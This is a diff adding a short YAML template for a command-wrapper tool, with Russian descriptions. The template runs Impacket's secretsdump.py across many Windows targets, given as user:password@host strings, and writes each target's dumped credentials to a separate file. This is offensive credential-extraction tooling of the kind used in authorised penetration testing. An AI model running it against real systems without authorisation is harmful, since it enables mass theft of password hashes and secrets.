@@ -1,0 +1,40 @@
+description: |-
+  Запускает secretsdump на множество целей
+author: vinzekatze
+
+tags:
+  - secretsdump.py
+
+arguments:
+  targets:
+    multiple: true
+    description: >-
+      [[domain/]username[:password]@]<targetName or address> и/или файлы с такими строками
+  log:
+    default:
+      - a
+      - b
+    description: >- 
+      записывать результаты для каждого таргета в отдельный файл в директории запуска
+    replacer: '#OUTFILE-MECH#'
+
+mode:
+  format:
+    targets: '{!r}'
+  loop: targets
+  replace:
+    log:
+      a: >-
+        echo 'secretsdump.py "$targ"';
+      b: >-
+        secretsdump.py "$targ" -outputfile $(echo "${targ#*@}-${targ%:*}.secdump.txt" | sed -e 's/[^A-Za-z0-9._-]/_/g');
+
+shell: bash
+
+script: >-
+  for targ in $(cat #targets# 2>/dev/null || echo #targets#); do 
+  echo -en "\e[1;91mTarget: \e[0m"; echo "${targ#*@} (${targ%:*})";
+  #OUTFILE-MECH#
+  echo; done
+
+
